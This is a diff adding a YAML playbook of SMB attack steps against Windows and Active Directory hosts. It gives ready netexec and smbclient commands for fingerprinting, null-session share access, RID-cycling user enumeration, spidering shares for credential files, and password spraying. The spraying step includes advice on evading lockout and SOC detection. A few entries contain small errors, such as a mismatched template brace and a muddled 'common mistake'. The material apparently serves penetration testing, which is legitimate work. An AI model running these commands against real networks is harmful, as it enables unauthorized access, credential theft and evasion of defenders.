@@ -1,0 +1,63 @@
+- id: "smb-version-check"
+  title: "SMB Version & OS Fingerprinting"
+  phase: "reconnaissance"
+  purpose: "Identify the exact SMB protocol version, operating system release, build number, domain name, and whether SMB signing is required or enabled."
+  command: "netexec smb {{TARGET}} --users"
+  expected_output:
+    - "[*] SMB {{TARGET}} 445 [HOSTNAME] [*] Windows 10.0 Build 19041 x64 (name:DOMAIN) (domain:DOMAIN.LOCAL) (signing:False) (SMBv1:False)"
+    - "[+] DOMAIN\\guest: READ permissions allowed"
+  common_mistakes:
+    - "Skipping host resolution when targeting Active Directory domain controllers."
+    - "Assuming SMB signing is enforced without verifying (signing:False allows NTLM relaying attacks)."
+
+- id: "smb-null-session"
+  title: "SMB Null / Anonymous Session Check"
+  phase: "enumeration"
+  purpose: "Test if the target permits unauthenticated (null session) connections or allows guest access without supplying valid credentials."
+  command: "netexec smb {{TARGET}} -u '' -p '' --shares"
+  expected_output:
+    - "[+] \\\\{{TARGET}}\\IPC$ READ"
+    - "[+] \\\\{{TARGET}}\\public READ, WRITE"
+    - "[-] \\\\{{TARGET}}\\C$ (Access Denied)"
+  common_mistakes:
+    - "Forgetting to test both null session (empty user/pass) and guest account (user 'guest' with no password)."
+    - "Assuming lack of write access implies lack of read access."
+
+- id: "smb-rid-brute"
+  title: "User Enumeration via RID Cycling"
+  phase: "enumeration"
+  purpose: "Query relative identifiers (RIDs) over SMB/RPC to systematically discover domain or local usernames and SIDs without knowing full accounts in advance."
+  command: "netexec smb {{TARGET}} -u '{{USERNAME|guest}}' -p '{{PASSWORD|}' --rid-brute 10000"
+  expected_output:
+    - "[*] 500: DOMAIN\\Administrator (SidTypeUser)"
+    - "[*] 501: DOMAIN\\Guest (SidTypeUser)"
+    - "[*] 1104: DOMAIN\\svc-sql (SidTypeUser)"
+    - "[*] 1105: DOMAIN\\jdoe (SidTypeUser)"
+  common_mistakes:
+    - "Not starting from RID 500 (Administrator) or stopping too early before reaching custom service accounts (e.g. RID 1000-2000)."
+    - "Failing to save discovered user accounts into your target user wordlist for subsequent roasting or spraying."
+
+- id: "smb-share-contents"
+  title: "Recursive Share Content Inspection"
+  phase: "enumeration"
+  purpose: "Connect to readable shares and spider file names, looking for configuration files, backup archives, scripts, credentials, or juicy documents."
+  command: "smbclient //{{TARGET}}/{{SHARE_NAME|public}} -N -c 'recurse;ls'"
+  expected_output:
+    - ".\\backup\\config.ini"
+    - ".\\scripts\\deploy.ps1"
+    - ".\\passwords.kdbx"
+  common_mistakes:
+    - "Using forward slashes in smbclient commands when interacting with nested Windows paths."
+    - "Not checking for hidden shares like C$, ADMIN$, IPC$, or custom hidden shares ending with '$'."
+
+- id: "smb-pass-spray"
+  title: "Password Spraying against Discovered Users"
+  phase: "exploitation"
+  purpose: "Test a single known default or seasonal password against all enumerated user accounts while avoiding domain account lockout thresholds."
+  command: "netexec smb {{TARGET}} -u users.txt -p '{{PASSWORD|Summer2024!}}' --continue-on-success"
+  expected_output:
+    - "[+] DOMAIN\\jdoe:Summer2024! (Pwn3d!)"
+    - "[-] DOMAIN\\admin:Summer2024! (STATUS_LOGON_FAILURE)"
+  common_mistakes:
+    - "Spraying without checking the Domain Lockout Policy (LockoutThreshold / LockoutDuration) first via LDAP or RPC."
+    - "Spraying too fast and triggering Active Directory lockout alarms or SOC detection rules."
